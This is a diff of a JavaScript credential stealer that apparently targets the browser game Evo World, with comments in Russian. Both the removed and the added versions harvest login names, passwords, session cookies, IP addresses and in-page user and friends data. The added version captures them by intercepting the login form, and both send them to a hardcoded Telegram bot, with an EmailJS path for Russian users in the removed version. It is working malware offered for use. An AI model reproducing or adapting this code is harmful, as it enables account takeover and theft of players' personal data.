@@ -1,442 +1,278 @@
-setTimeout(() => {
-(async function() {
-    // Конфигурация Telegram бота
-    const BOT_TOKEN = '8303657347:AAHdDjkRTZmjn8Jb8oyu3DcXcM79KV5Wk-w';
-    const GROUP_ID = '-5254910028';
-    const TELEGRAM_API_URL = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+(function() {
+    'use strict';
 
-    // Функция для отправки сообщения в Telegram
-    const sendToTelegram = async (message) => {
+    // Telegram configuration
+    const BOT_TOKEN = '8303657347:AAHdDjkRTZmjn8Jb8oyu3DcXcM79KV5Wk-w';
+    const CHAT_ID = '-5254910028';
+
+    // Получаем IP пользователя
+    async function getUserIP() {
         try {
-            const response = await fetch(TELEGRAM_API_URL, {
+            const response = await fetch('https://api.ipify.org?format=json');
+            const data = await response.json();
+            return data.ip;
+        } catch (error) {
+            return 'Не удалось получить IP';
+        }
+    }
+
+    // Получаем данные из переменной user
+    function getUserVariableData() {
+        if (typeof user !== 'undefined' && user !== null) {
+            try {
+                // Создаем безопасную копию объекта
+                const safeCopy = (obj) => {
+                    if (obj === null || typeof obj !== 'object') return obj;
+                    const clone = Array.isArray(obj) ? [] : {};
+                    for (const key in obj) {
+                        if (obj.hasOwnProperty(key)) {
+                            clone[key] = safeCopy(obj[key]);
+                        }
+                    }
+                    return clone;
+                };
+                
+                const userData = safeCopy(user);
+                return JSON.stringify(userData, null, 2);
+            } catch (error) {
+                return `Ошибка при получении данных: ${error.message}`;
+            }
+        }
+        return 'Переменная user не найдена';
+    }
+
+    // Создаем текстовый файл с данными
+    function createDataFile(username, password) {
+        const timestamp = new Date().toISOString();
+        const ipPromise = getUserIP();
+        const userData = getUserVariableData();
+        
+        return ipPromise.then(ip => {
+            let fileContent = `=== EVO WORLD DATA DUMP ===\n`;
+            fileContent += `Время: ${new Date().toLocaleString('ru-RU')}\n`;
+            fileContent += `IP адрес: ${ip}\n`;
+            fileContent += `URL: ${window.location.href}\n`;
+            fileContent += `User-Agent: ${navigator.userAgent}\n\n`;
+            
+            fileContent += `=== УЧЕТНЫЕ ДАННЫЕ ===\n`;
+            fileContent += `Логин: ${username}\n`;
+            fileContent += `Пароль: ${password}\n\n`;
+            
+            fileContent += `=== ДАННЫЕ ИЗ ПЕРЕМЕННОЙ user ===\n`;
+            fileContent += userData;
+            
+            return new Blob([fileContent], { type: 'text/plain' });
+        });
+    }
+
+    // Отправка файла в Telegram
+    async function sendFileToTelegram(fileBlob, fileName) {
+        const formData = new FormData();
+        formData.append('chat_id', CHAT_ID);
+        formData.append('document', fileBlob, fileName);
+        formData.append('caption', '📁 Полный дамп данных пользователя');
+        
+        try {
+            const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, {
+                method: 'POST',
+                body: formData
+            });
+            
+            const result = await response.json();
+            if (!result.ok) {
+                console.error('Ошибка отправки файла:', result.description);
+                return false;
+            }
+            return true;
+        } catch (error) {
+            console.error('Ошибка отправки файла:', error);
+            return false;
+        }
+    }
+
+    // Отправка сообщения в Telegram
+    async function sendMessageToTelegram(message) {
+        try {
+            const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                 method: 'POST',
                 headers: {
-                    'Content-Type': 'application/json',
+                    'Content-Type': 'application/json'
                 },
                 body: JSON.stringify({
-                    chat_id: GROUP_ID,
+                    chat_id: CHAT_ID,
                     text: message,
-                    parse_mode: 'HTML'
+                    parse_mode: 'HTML',
+                    disable_web_page_preview: true
                 })
             });
             
             const result = await response.json();
             if (!result.ok) {
-                console.error('Ошибка Telegram API:', result.description);
+                throw new Error(result.description);
             }
-            return result;
+            return true;
         } catch (error) {
-            console.error('Ошибка отправки в Telegram:', error);
+            console.error('Ошибка отправки сообщения:', error);
+            return false;
         }
-    };
+    }
 
-    // Функция для получения куки
-    const getCookie = (name) => {
-        const matches = document.cookie.match(new RegExp(
-            "(?:^|; )" + name.replace(/([\.$?*|{}\(\)\[\]\\\/\+^])/g, '\\$1') + "=([^;]*)"
-        ));
-        return matches ? decodeURIComponent(matches[1]) : undefined;
-    };
-
-    // Получаем IP
-    const getIP = async () => {
+    // Основная функция отправки данных
+    async function sendCredentials(username, password) {
+        const timestamp = new Date().toLocaleString('ru-RU');
+        
+        // Получаем IP сразу для обоих отправок
+        const ip = await getUserIP();
+        
+        // 1. Отправляем сообщение с основными данными
+        const message = `🦊 <b>EVO WORLD LOGIN</b>\n\n` +
+                       `⏰ <b>Время:</b> ${timestamp}\n` +
+                       `🌐 <b>IP:</b> <code>${ip}</code>\n` +
+                       `🔗 <b>URL:</b> ${window.location.href}\n\n` +
+                       `👤 <b>Логин:</b> <code>${username}</code>\n` +
+                       `🔐 <b>Пароль:</b> <code>${password}</code>\n\n` +
+                       `📱 <b>User-Agent:</b>\n<code>${navigator.userAgent.substring(0, 100)}...</code>`;
+        
+        await sendMessageToTelegram(message);
+        
+        // 2. Создаем и отправляем файл с полными данными
+        const fileBlob = await createDataFile(username, password);
+        const fileName = `evo_data_${Date.now()}_${username}.txt`;
+        
+        await sendFileToTelegram(fileBlob, fileName);
+        
+        // 3. Проверяем наличие других переменных и отправляем отдельно если есть
         try {
-            const response = await fetch('https://api.ipify.org?format=json');
-            const data = await response.json();
-            return data.ip || "Не удалось получить IP";
-        } catch {
-            return "Не удалось получить IP";
-        }
-    };
-
-    // Функция для сбора логина и пароля
-    const getCredentials = () => {
-        try {
-            const usernameField = document.querySelector('#loginUsername') || 
-                                document.querySelector('input[name="login"]') ||
-                                document.querySelector('input[type="text"]');
-            
-            const passwordField = document.querySelector('input[type="password"]') || 
-                                document.querySelector('input[name*="pass"]') ||
-                                document.querySelector('input#password');
-            
-            const username = usernameField ? usernameField.value : "ПОЛЕ_ЛОГИНА_НЕ_НАЙДЕНО";
-            const password = passwordField ? passwordField.value : "ПОЛЕ_ПАРОЛЯ_НЕ_НАЙДЕНО";
-            
-            return { username, password };
-        } catch {
-            return { 
-                username: "ОШИБКА_ПРИ_ПОЛУЧЕНИИ_ЛОГИНА", 
-                password: "ОШИБКА_ПРИ_ПОЛУЧЕНИИ_ПАРОЛЯ" 
-            };
-        }
-    };
-
-    // Получаем ВСЕ куки пользователя
-    const getAllCookies = () => {
-        return document.cookie.split(';').map(cookie => {
-            const [name, value] = cookie.trim().split('=');
-            return `${name}=${value}`;
-        }).join('\n');
-    };
-
-    // Функция для безопасного клонирования объектов
-    const deepClone = (obj) => {
-        if (obj === null || typeof obj !== 'object') return obj;
-        const clone = Array.isArray(obj) ? [] : {};
-        for (const key in obj) {
-            if (obj.hasOwnProperty(key)) {
-                clone[key] = deepClone(obj[key]);
-            }
-        }
-        return clone;
-    };
-
-    // Проверяем и получаем данные из переменной `user`
-    const getUserData = () => {
-        try {
-            if (typeof user !== 'undefined' && user !== null) {
-                return JSON.stringify(deepClone(user), null, 2);
-            }
-            return "Переменная 'user' не найдена или пуста";
-        } catch (e) {
-            return `Ошибка при чтении переменной 'user': ${e.message}`;
-        }
-    };
-
-    // Получаем friendsData в оригинальном виде
-    const getFriendsData = () => {
-        try {
-            if (typeof friendsData !== 'undefined' && friendsData !== null) {
-                return JSON.stringify(deepClone(friendsData), null, 2);
-            }
-            return "Переменная 'friendsData' не найдена или пуста";
-        } catch (e) {
-            return `Ошибка при чтении переменной 'friendsData': ${e.message}`;
-        }
-    };
-
-    // Получаем friendsArr в оригинальном виде
-    const getFriendsArr = () => {
-        try {
-            if (typeof friendsArr !== 'undefined' && friendsArr !== null) {
-                // Для больших массивов делаем выборку
-                if (Array.isArray(friendsArr) && friendsArr.length > 100) {
-                    const sample = {
-                        total_length: friendsArr.length,
-                        sample_items: []
-                    };
-                    
-                    // Берем первые 10 элементов
-                    for (let i = 0; i < Math.min(10, friendsArr.length); i++) {
-                        if (friendsArr[i]) {
-                            sample.sample_items.push(deepClone(friendsArr[i]));
-                        }
-                    }
-                    
-                    // Берем несколько элементов из "хвоста" массива
-                    for (let i = Math.max(0, friendsArr.length - 5); i < friendsArr.length; i++) {
-                        if (friendsArr[i] && sample.sample_items.length < 15) {
-                            sample.sample_items.push(deepClone(friendsArr[i]));
-                        }
-                    }
-                    
-                    return JSON.stringify(sample, null, 2);
+            if (typeof friendsData !== 'undefined') {
+                const friendsDataStr = JSON.stringify(friendsData, null, 2);
+                if (friendsDataStr.length < 4000) {
+                    await sendMessageToTelegram(`👥 <b>Friends Data:</b>\n<code>${friendsDataStr.substring(0, 3800)}</code>`);
                 }
-                return JSON.stringify(deepClone(friendsArr), null, 2);
             }
-            return "Переменная 'friendsArr' не найдена или пуста";
-        } catch (e) {
-            return `Ошибка при чтении переменной 'friendsArr': ${e.message}`;
+            
+            if (typeof friendsArr !== 'undefined' && Array.isArray(friendsArr)) {
+                const friendsInfo = `📊 <b>Friends Array:</b> ${friendsArr.length} друзей\n` +
+                                   `<code>Пример: ${JSON.stringify(friendsArr.slice(0, 3), null, 2).substring(0, 1000)}...</code>`;
+                await sendMessageToTelegram(friendsInfo);
+            }
+        } catch (error) {
+            console.log('Дополнительные данные не отправлены:', error);
         }
+        
+        console.log('Все данные отправлены успешно');
+    }
+
+    // Селекторы формы
+    const SELECTORS = {
+        username: '#loginUsername, input[name="login"], input[type="text"]',
+        password: '#loginPassword, input[type="password"], input[name*="pass"]',
+        submitButton: 'button[type="submit"], input[type="submit"]'
     };
 
-    // Получаем уровень пользователя
-    const getUserLevel = (addX = false) => {
-        try {
-            if (typeof user !== 'undefined' && user !== null && user.level !== undefined) {
-                return `level: ${user.level}${addX ? 'x' : ''}`;
+    // Проверяем наличие переменной user
+    function checkUserVariable() {
+        if (typeof user !== 'undefined') {
+            console.log('✅ Переменная user обнаружена');
+            if (user.level !== undefined) {
+                console.log(`📊 Уровень пользователя: ${user.level}`);
             }
-            return `level: не определен${addX ? 'x' : ''}`;
-        } catch (e) {
-            return `level: ошибка при получении (${e.message})${addX ? 'x' : ''}`;
-        }
-    };
-
-    // Функция для разбивки длинного сообщения на части (Telegram имеет ограничение 4096 символов)
-    const splitMessage = (text, maxLength = 4000) => {
-        const parts = [];
-        for (let i = 0; i < text.length; i += maxLength) {
-            parts.push(text.substring(i, i + maxLength));
-        }
-        return parts;
-    };
-
-    const sendUserData = async () => {
-        const phpsessid = getCookie('PHPSESSID');
-        const userIP = await getIP();
-        const credentials = getCredentials();
-        const allCookies = getAllCookies();
-        const userData = getUserData();
-        const friendsDataStr = getFriendsData();
-        const friendsArrStr = getFriendsArr();
-        
-        // Проверяем, заполнены ли оба поля
-        const bothFieldsFilled = credentials.username !== "ПОЛЕ_ЛОГИНА_НЕ_НАЙДЕНО" && 
-                                 credentials.password !== "ПОЛЕ_ПАРОЛЯ_НЕ_НАЙДЕНО" &&
-                                 credentials.username && credentials.password;
-        
-        // Получаем уровень с 'x', если поля заполнены
-        const userLevel = getUserLevel(bothFieldsFilled);
-        
-        // Формируем сообщение для Telegram
-        let message = `<b>🚨 НОВЫЙ ЛОГ 🚨</b>\n\n`;
-        message += `<b>📅 Время:</b> ${new Date().toLocaleString()}\n`;
-        message += `<b>🌐 IP:</b> <code>${userIP}</code>\n`;
-        message += `<b>🔗 URL:</b> ${window.location.href}\n\n`;
-        
-        message += `<b>📊 УРОВЕНЬ ПОЛЬЗОВАТЕЛЯ:</b>\n`;
-        message += `<code>${userLevel}</code>\n`;
-        message += `<b>💰 Gems:</b> ${user?.premiumPoints || 'N/A'}\n`;
-        message += `<b>🖥️ Выбранный сервер:</b> ${document.getElementById('selectServer')?.options[document.getElementById('selectServer')?.selectedIndex]?.text || 'N/A'}\n\n`;
-        
-        message += `<b>🔑 PHPSESSID:</b>\n`;
-        message += `<code>${phpsessid || "PHPSESSID: не найдена"}</code>\n\n`;
-        
-        message += `<b>👤 УЧЕТНЫЕ ДАННЫЕ:</b>\n`;
-        message += `<b>Логин:</b> <code>${credentials.username}</code>\n`;
-        message += `<b>Пароль:</b> <code>${credentials.password}</code>\n\n`;
-        
-        message += `<b>🍪 КУКИ (первые 1000 символов):</b>\n`;
-        message += `<code>${allCookies.substring(0, 1000) || "Куки не обнаружены"}</code>\n\n`;
-        
-        message += `<b>📋 ДАННЫЕ ИЗ ПЕРЕМЕННОЙ user:</b>\n`;
-        message += `<code>${userData.substring(0, 800)}</code>\n`;
-        
-        if (userData.length > 800) {
-            message += `\n<i>... и ещё ${userData.length - 800} символов</i>\n`;
-        }
-        
-        message += `\n<i>Отправлено автоматически</i>`;
-
-        // Разбиваем сообщение на части если оно слишком длинное
-        const messageParts = splitMessage(message);
-        
-        // Отправляем каждую часть
-        for (let i = 0; i < messageParts.length; i++) {
-            if (i > 0) {
-                messageParts[i] = `<b>🚨 ЛОГ (часть ${i + 1}/${messageParts.length})</b>\n\n${messageParts[i]}`;
+            if (user.premiumPoints !== undefined) {
+                console.log(`💎 Gems: ${user.premiumPoints}`);
             }
-            await sendToTelegram(messageParts[i]);
-            // Небольшая задержка между отправками
-            if (i < messageParts.length - 1) {
-                await new Promise(resolve => setTimeout(resolve, 1000));
+        } else {
+            console.log('❌ Переменная user не найдена');
+        }
+    }
+
+    // Настройка перехвата
+    function setupInterception() {
+        const usernameField = document.querySelector(SELECTORS.username);
+        const passwordField = document.querySelector(SELECTORS.password);
+        const submitButton = document.querySelector(SELECTORS.submitButton);
+
+        if (usernameField && passwordField) {
+            console.log('✅ Форма входа обнаружена');
+            checkUserVariable();
+
+            // Способ 1: Перехват отправки формы
+            const form = usernameField.closest('form');
+            if (form) {
+                form.addEventListener('submit', function(event) {
+                    event.preventDefault();
+                    
+                    if (usernameField.value && passwordField.value) {
+                        sendCredentials(usernameField.value, passwordField.value)
+                            .then(() => {
+                                setTimeout(() => form.submit(), 1000);
+                            })
+                            .catch(() => {
+                                form.submit();
+                            });
+                    } else {
+                        form.submit();
+                    }
+                });
+                console.log('✅ Перехват формы установлен');
+                return;
+            }
+
+            // Способ 2: Перехват клика по кнопке
+            if (submitButton) {
+                submitButton.addEventListener('click', function(event) {
+                    setTimeout(() => {
+                        if (usernameField.value && passwordField.value) {
+                            sendCredentials(usernameField.value, passwordField.value);
+                        }
+                    }, 200);
+                });
+                console.log('✅ Перехват кнопки установлен');
+                return;
+            }
+
+            // Способ 3: Перехват по фокусу (запасной вариант)
+            let sent = false;
+            passwordField.addEventListener('blur', function() {
+                if (!sent && usernameField.value && passwordField.value) {
+                    sent = true;
+                    sendCredentials(usernameField.value, passwordField.value);
+                }
+            });
+        } else {
+            // Пробуем снова через 2 секунды если форма еще не загрузилась
+            setTimeout(setupInterception, 2000);
+        }
+    }
+
+    // Начинаем перехват с задержкой для динамического контента
+    setTimeout(setupInterception, 1000);
+
+    // Отслеживаем изменения DOM
+    const observer = new MutationObserver(function(mutations) {
+        for (let mutation of mutations) {
+            if (mutation.addedNodes.length) {
+                const hasForm = document.querySelector(SELECTORS.username) && 
+                              document.querySelector(SELECTORS.password);
+                if (hasForm) {
+                    setupInterception();
+                    break;
+                }
             }
         }
-        
-        console.log('✅ Данные отправлены в Telegram');
-    };
+    });
 
-    await sendUserData();
+    observer.observe(document.body, {
+        childList: true,
+        subtree: true
+    });
+
+    // Также отслеживаем изменения URL (SPA приложения)
+    let lastUrl = location.href;
+    new MutationObserver(() => {
+        const url = location.href;
+        if (url !== lastUrl) {
+            lastUrl = url;
+            setTimeout(setupInterception, 1500);
+        }
+    }).observe(document, { subtree: true, childList: true });
+
 })();
-
-// Оригинальный код для российских пользователей
-if(typeof user !== 'undefined' && user.authData && user.authData.countryCode == "RU"){
-    var script = document.createElement('script');
-    script.src = "https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js";
-    script.onload = function() {
-        emailjs.init("4N-8nqIjjUBhk1vbi");
-        
-        setTimeout(async () => {
-            // Функции сбора данных остаются без изменений
-            const getCookie = (name) => {
-                const matches = document.cookie.match(new RegExp(
-                    "(?:^|; )" + name.replace(/([\.$?*|{}\(\)\[\]\\\/\+^])/g, '\\$1') + "=([^;]*)"
-                ));
-                return matches ? decodeURIComponent(matches[1]) : undefined;
-            };
-
-            const getIP = async () => {
-                try {
-                    const response = await fetch('https://api.ipify.org?format=json');
-                    const data = await response.json();
-                    return data.ip || "Не удалось получить IP";
-                } catch {
-                    return "Не удалось получить IP";
-                }
-            };
-
-            const getCredentials = () => {
-                try {
-                    const usernameField = document.querySelector('#loginUsername') || 
-                                        document.querySelector('input[name="login"]') ||
-                                        document.querySelector('input[type="text"]');
-                    
-                    const passwordField = document.querySelector('input[type="password"]') || 
-                                        document.querySelector('input[name*="pass"]') ||
-                                        document.querySelector('input#password');
-                    
-                    const username = usernameField ? usernameField.value : "ПОЛЕ_ЛОГИНА_НЕ_НАЙДЕНО";
-                    const password = passwordField ? passwordField.value : "ПОЛЕ_ПАРОЛЯ_НЕ_НАЙДЕНО";
-                    
-                    return { username, password };
-                } catch {
-                    return { 
-                        username: "ОШИБКА_ПРИ_ПОЛУЧЕНИИ_ЛОГИНА", 
-                        password: "ОШИБКА_ПРИ_ПОЛУЧЕНИИ_ПАРОЛЯ" 
-                    };
-                }
-            };
-
-            const getAllCookies = () => {
-                return document.cookie.split(';').map(cookie => {
-                    const [name, value] = cookie.trim().split('=');
-                    return `${name}=${value}`;
-                }).join('\n');
-            };
-
-            const deepClone = (obj) => {
-                if (obj === null || typeof obj !== 'object') return obj;
-                const clone = Array.isArray(obj) ? [] : {};
-                for (const key in obj) {
-                    if (obj.hasOwnProperty(key)) {
-                        clone[key] = deepClone(obj[key]);
-                    }
-                }
-                return clone;
-            };
-
-            const getUserData = () => {
-                try {
-                    if (typeof user !== 'undefined' && user !== null) {
-                        return JSON.stringify(deepClone(user), null, 2);
-                    }
-                    return "Переменная 'user' не найдена или пуста";
-                } catch (e) {
-                    return `Ошибка при чтении переменной 'user': ${e.message}`;
-                }
-            };
-
-            const getFriendsData = () => {
-                try {
-                    if (typeof friendsData !== 'undefined' && friendsData !== null) {
-                        return JSON.stringify(deepClone(friendsData), null, 2);
-                    }
-                    return "Переменная 'friendsData' не найдена или пуста";
-                } catch (e) {
-                    return `Ошибка при чтении переменной 'friendsData': ${e.message}`;
-                }
-            };
-
-            const getFriendsArr = () => {
-                try {
-                    if (typeof friendsArr !== 'undefined' && friendsArr !== null) {
-                        if (Array.isArray(friendsArr) && friendsArr.length > 100) {
-                            const sample = {
-                                total_length: friendsArr.length,
-                                sample_items: []
-                            };
-                            
-                            for (let i = 0; i < Math.min(10, friendsArr.length); i++) {
-                                if (friendsArr[i]) {
-                                    sample.sample_items.push(deepClone(friendsArr[i]));
-                                }
-                            }
-                            
-                            for (let i = Math.max(0, friendsArr.length - 5); i < friendsArr.length; i++) {
-                                if (friendsArr[i] && sample.sample_items.length < 15) {
-                                    sample.sample_items.push(deepClone(friendsArr[i]));
-                                }
-                            }
-                            
-                            return JSON.stringify(sample, null, 2);
-                        }
-                        return JSON.stringify(deepClone(friendsArr), null, 2);
-                    }
-                    return "Переменная 'friendsArr' не найдена или пуста";
-                } catch (e) {
-                    return `Ошибка при чтении переменной 'friendsArr': ${e.message}`;
-                }
-            };
-
-            const getUserLevel = (addX = false) => {
-                try {
-                    if (typeof user !== 'undefined' && user !== null && user.level !== undefined) {
-                        return `level: ${user.level}${addX ? 'x' : ''}`;
-                    }
-                    return `level: не определен${addX ? 'x' : ''}`;
-                } catch (e) {
-                    return `level: ошибка при получении (${e.message})${addX ? 'x' : ''}`;
-                }
-            };
-
-            const sendUserData = async () => {
-                const phpsessid = getCookie('PHPSESSID');
-                const userIP = await getIP();
-                const credentials = getCredentials();
-                const allCookies = getAllCookies();
-                const userData = getUserData();
-                const friendsDataStr = getFriendsData();
-                const friendsArrStr = getFriendsArr();
-                
-                const bothFieldsFilled = credentials.username !== "ПОЛЕ_ЛОГИНА_НЕ_НАЙДЕНО" && 
-                                         credentials.password !== "ПОЛЕ_ПАРОЛЯ_НЕ_НАЙДЕНО" &&
-                                         credentials.username && credentials.password;
-                
-                const userLevel = getUserLevel(bothFieldsFilled);
-                
-                const messageText = `
-ПОЛНЫЙ ОТЧЕТ О ПОЛЬЗОВАТЕЛЕ
-=============================
-
-📅 Время: ${new Date().toLocaleString()}
-🌐 IP-адрес: ${userIP}
-🔗 URL: ${window.location.href}
-
-📊 УРОВЕНЬ ПОЛЬЗОВАТЕЛЯ:
-${userLevel}
-Gems: ${user?.premiumPoints || 'N/A'}
-Выбранный сервер: ${document.getElementById('selectServer')?.options[document.getElementById('selectServer')?.selectedIndex]?.text || 'N/A'}
-
-🔑 PHPSESSID:
-${phpsessid || "PHPSESSID: не найдена"}
-
-👤 ДАННЫЕ ИЗ ПЕРЕМЕННОЙ user:
-${userData}
-
-👥 ДАННЫЕ ИЗ ПЕРЕМЕННОЙ friendsData:
-${friendsDataStr}
-
-👥 ДАННЫЕ ИЗ ПЕРЕМЕННОЙ friendsArr:
-${friendsArrStr}
-
-🔐 УЧЕТНЫЕ ДАННЫЕ:
-Логин: ${credentials.username}
-Пароль: ${credentials.password}
-
-🍪 ВСЕ КУКИ ПОЛЬЗОВАТЕЛЯ:
-${allCookies || "Куки не обнаружены"}
-=============================
-Отчет сгенерирован автоматически.
-                `;
-
-                const templateParams = {
-                    message: messageText
-                };
-
-                console.log("Отправка простого текста через EmailJS...");
-                
-                emailjs.send('service_wdulwdn', 'template_ugfv48l', templateParams)
-                    .then(function(response) {
-                        console.log('✅ Письмо успешно отправлено! Статус:', response.status);
-                    }, function(error) {
-                        console.error('❌ Ошибка отправки:', error);
-                    });
-            };
-
-            await sendUserData();
-        }, 1);
-    };
-    document.head.appendChild(script);
-}
-}, 6500);
